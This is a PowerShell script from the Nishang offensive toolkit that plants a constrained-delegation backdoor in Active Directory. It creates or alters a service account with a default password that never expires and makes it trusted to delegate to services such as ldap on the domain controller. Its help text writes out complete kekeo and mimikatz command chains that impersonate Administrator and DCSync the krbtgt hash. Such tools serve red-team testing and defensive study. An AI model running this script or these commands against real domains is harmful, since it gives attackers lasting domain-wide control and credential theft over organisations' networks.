#Requires -Modules ActiveDirectory

# If you do not have AD module, you can refer to the following link.
# https://github.com/samratashok/ADModule

function Add-ConstrainedDelegationBackdoor
{
<#
.SYNOPSIS
Nishang Script which could add constrained delegation backdoor service accounts or add constrained delegation backdoor functionality to existing service accounts.

.DESCRIPTION
This script (by @D1iv3) will add a new service account which is allowed to delegate to some exploitable services, e.g ldap/DC.LAB.LOCAL.
The script needs Microsoft's ActiveDirectory module. You can get the module from a machine with RSAT or from here: https://github.com/samratashok/ADModule
Attackers can use this backdoor service account to get TGS of ldap/DC.LAB.LOCAL through s4u2self and s4u2proxy protocol.

Attack example:
kekeo.exe "tgt::ask /user:backdoor_svc /domain:lab.local /password:d1ive@Dubhe" exit
kekeo.exe "tgs::s4u /tgt:TGT_backdoor_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:ldap/DC.lab.local" exit
mimikatz.exe "kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_ldap~DC2.lab.local@LAB.LOCAL.kirbi" exit
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:lab.local" exit

This script needs to be executed from a shell with domain administrator privileges.

To use the ADModule with this script, run the following commands:
PS C:\> Import-Module C:\ADModule\Microsoft.ActiveDirectory.Management.dll -Verbose

PS C:\> Import-Module C:\AD\Tools\ADModule\ActiveDirectory\ActiveDirectory.psd1


.PARAMETER SamAccountName
Samaccountname of the target user

.PARAMETER Password
Password of the backdoor service account. The default value is Password@123!

.PARAMETER Domain
Target domain FQDN

.PARAMETER ServicePrincipalName
Backdoor serviceprincipalname which is set on the target user object so that delegation can be enabled.

.PARAMETER AllowedToDelegateTo
Principle Name of the service which the backdoor service account is allowed to delegate to 

.EXAMPLE
PS > Add-ConstrainedDelegationBackdoor -SamAccountName backdoor -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
Use above command to create a new backdoor service account named "backdoor" with password Password@123!

.EXAMPLE
PS > Add-ConstrainedDelegationBackdoor -SamAccountName iis_svc -Domain lab.local -AllowedToDelegateTo ldap/DC.lab.local
Use above command to add backdoor functionality to the iis_svc service account. 
It should be noted that the attacker needs to know the password of iis_svc.

Attack example:
kekeo.exe "tgt::ask /user:iis_svc /domain:lab.local /password:d1ive@Dubhe" exit
kekeo.exe "tgs::s4u /tgt:TGT_iisr_svc@LAB.LOCAL_krbtgt~lab.local@LAB.LOCAL.kirbi /user:Administrator@lab.local /service:ldap/DC.lab.local" exit
mimikatz.exe "kerberos::ptt TGS_Administrator@lab.local@LAB.LOCAL_ldap~DC2.lab.local@LAB.LOCAL.kirbi" exit
mimikatz.exe "lsadump::dcsync /user:krbtgt /domain:lab.local" exit


.LINK
https://github.com/samratashok/nishang/pull/65
https://github.com/samratashok/nishang
https://labs.mwrinfosecurity.com/blog/trust-years-to-earn-seconds-to-break/
#>


    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $SamAccountName,

        [Parameter(Position = 1, Mandatory = $False)]
        [String]
        $Password = "Password@123!",

        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Domain,

        [Parameter(Position = 3, Mandatory = $False)]
        [String]
        $ServicePrincipalName,

        [Parameter(Position = 4, Mandatory = $True)]
        [String]
        $AllowedToDelegateTo
    )

    Write-Warning "This script must be run with Domain Administrator privileges or equivalent permissions. This is not a check but a reminder."
   
    $Name = $SamAccountName
    $UserPrincipalName = $SamAccountName + "@" + $Domain

    if (!$ServicePrincipalName) 
    {
        $ServicePrincipalName = $SamAccountName + "/" + $Domain
    }
    
    Try {
        $user = Get-ADUser $SamAccountName -Properties "msDS-AllowedToDelegateTo"
        Write-Output "User '$SamAccountName' already exists. Adding 'msDS-AllowedToDelegateTo $AllowedToDelegateTo' to '$SamAccountName'."
    } Catch [Microsoft.ActiveDirectory.Management.ADIdentityNotFoundException] {
        Write-Verbose "Adding new user $SamAccountName"
        New-ADUser -Name $Name -SamAccountName $SamAccountName -UserPrincipalName $UserPrincipalName -ServicePrincipalNames $ServicePrincipalName -AccountPassword (convertto-securestring "$Password" -asplaintext -force)  -PasswordNeverExpires $True  -PassThru | Enable-ADAccount
        $user = Get-ADUser $SamAccountName -Properties "msDS-AllowedToDelegateTo"
    }
    Write-Verbose "Setting user $SamAccountName's msds-AllowedToDelegateTo $AllowedToDelegateTo"
    Set-ADObject $user -Add @{ "msDS-AllowedToDelegateTo" = @( $AllowedToDelegateTo ) }
    Write-Verbose "Setting user $SamAccountName to be trusted for delegation."
    Set-ADAccountControl $user -TrustedToAuthForDelegation $true
}

